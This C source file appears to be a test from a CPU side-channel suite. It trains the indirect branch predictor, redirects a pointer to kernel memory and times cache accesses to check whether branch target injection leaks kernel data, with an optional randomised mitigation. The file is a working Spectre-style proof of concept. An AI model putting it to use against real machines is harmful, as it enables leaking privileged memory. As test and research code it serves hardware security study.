#include "kernel_bti_test.h"

#include "../tester.h"

#include "../cache/cache_test.h"

#include "immintr.h"
#include "mem.h"
#include "rand.h"
#include "types.h"

AS_RESULT(kernel_bti_result_t);

volatile u8 CACHE_LINE_ALIGNED safe_ptr[CACHE_LINE_SZ] = {1};
volatile u8 *ptr = safe_ptr;

no_inline CACHE_LINE_ALIGNED void target_A(void) { load(ptr); }
no_inline CACHE_LINE_ALIGNED void target_B(void) { nop(); }

no_inline CACHE_LINE_ALIGNED void target_1(void) { nop(); }
no_inline CACHE_LINE_ALIGNED void target_2(void) { nop(); }
no_inline CACHE_LINE_ALIGNED void target_3(void) { nop(); }
no_inline CACHE_LINE_ALIGNED void target_4(void) { nop(); }
no_inline CACHE_LINE_ALIGNED void target_5(void) { nop(); }
no_inline CACHE_LINE_ALIGNED void target_6(void) { nop(); }
no_inline CACHE_LINE_ALIGNED void target_7(void) { nop(); }
no_inline CACHE_LINE_ALIGNED void target_8(void) { nop(); }

#define COUNT 8
void (*targets[COUNT])(void) = {
    target_1, target_2, target_3, target_4,
    target_5, target_6, target_7, target_8,
};

u64 *target;

no_inline void indirect_call(void) { ((void (*)(void))(*target))(); }

#ifdef MITIGATE
#define mcall                                                                  \
  *target = (u64)(targets[(u64)get_rand() % COUNT]);                           \
  indirect_call();
#else
#define mcall
#endif

void func(request_dependencies_t *args) {
  cache_result_t *cache_r = args[1];
  RESULT->iters = cache_r->tries;
  RESULT->uncached_access_time = cache_r->uncached_access_time;
  RESULT->overhead = cache_r->overhead;

  ker_open();
  volatile u8 CACHE_LINE_ALIGNED *kptr = (volatile u8 *)get_kernel_ptr();

  const u64 train_iters = 1000;
  target = alloc(sizeof(u64));

  for (int j = 0; j < RESULT->iters; j++) {
    ptr = safe_ptr;
    target_A();

    for (int i = 0; i < train_iters; i++) {
      *target = (u64)(&target_A);
      mcall;
      memory_barrier();
      indirect_call();
    }

    kernel_ptr_cache_flush();
    serialise();
    memory_barrier();

    for (int i = 0; i < train_iters; i++) {
      mcall;
      *target = (u64)(&target_A);
      memory_barrier();
      indirect_call();
    }

    kernel_ptr_cache_flush();
    serialise();

    *target = (u64)(&target_B);
    ptr = kptr;

    memory_barrier();
    serialise();

    cache_line_flush(target);

    memory_barrier();
    serialise();

    indirect_call();

    memory_barrier();
    serialise();

    RESULT->measured_access_time_tot += get_kernel_time();
  }
}

#include "../tester.c"
